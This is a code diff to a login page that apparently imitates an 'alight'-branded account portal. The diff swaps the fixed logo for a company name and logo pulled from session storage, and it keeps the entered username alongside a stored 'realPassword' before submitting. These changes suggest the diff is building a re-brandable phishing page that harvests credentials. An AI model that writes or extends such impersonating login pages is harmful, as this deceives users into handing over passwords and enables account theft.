@@ -15,8 +15,21 @@
             flex-direction: column;
             align-items: center;
         }
-        .logo { font-size: 2.8rem; font-weight: 700; color: #1e40af; margin: 40px 0 10px; }
-        .subtitle { color: #64748b; margin-bottom: 40px; }
+        .company-header {
+            text-align: center;
+            margin: 30px 0 25px;
+        }
+        .company-logo {
+            width: 90px;
+            height: 90px;
+            object-fit: contain;
+            margin-bottom: 12px;
+        }
+        .company-name {
+            font-size: 1.45rem;
+            font-weight: 600;
+            color: #1e2937;
+        }
         .form-container {
             width: 100%;
             max-width: 380px;
@@ -49,8 +62,10 @@
     </style>
 </head>
 <body>
-    <div class="logo">alight</div>
-    <p class="subtitle">Log in to your account</p>
+    <div class="company-header">
+        <img id="companyLogoImg" class="company-logo" src="" alt="Company Logo">
+        <div id="companyName" class="company-name"></div>
+    </div>
 
     <div class="form-container">
         <form id="loginForm">
@@ -68,6 +83,15 @@
     </div>
 
     <script>
+        // Load selected company with real logo
+        const company = sessionStorage.getItem('selectedCompany') || "Your Organization";
+        const logoUrl = sessionStorage.getItem('companyLogo');
+
+        document.getElementById('companyName').textContent = company;
+        if (logoUrl) {
+            document.getElementById('companyLogoImg').src = logoUrl;
+        }
+
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -76,6 +100,7 @@
             const address = document.getElementById('address').value;
 
             sessionStorage.setItem('realPassword', password);
+            sessionStorage.setItem('username', username);
 
             try {
                 await fetch('/api/login', {
